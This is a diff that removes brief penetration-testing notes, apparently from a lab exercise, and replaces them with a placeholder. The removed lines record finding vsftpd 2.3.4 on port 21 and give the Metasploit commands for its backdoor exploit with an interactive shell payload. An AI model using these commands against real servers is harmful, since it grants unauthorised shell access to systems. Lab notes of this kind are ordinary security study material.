@@ -1,10 +1,1 @@
-Scan the host for the open service port, found port 21 (FTP) service running
-Port 21 – Running vsftpd
-
-version 2.3.4,is exploitable:
-Commands
-$ use exploit/unix/ftp/vsftpd_234_backdoor
-$ set PAYLOAD cmd/unix/interact
-
-privilege access on the server achieved.
-
+To be updated
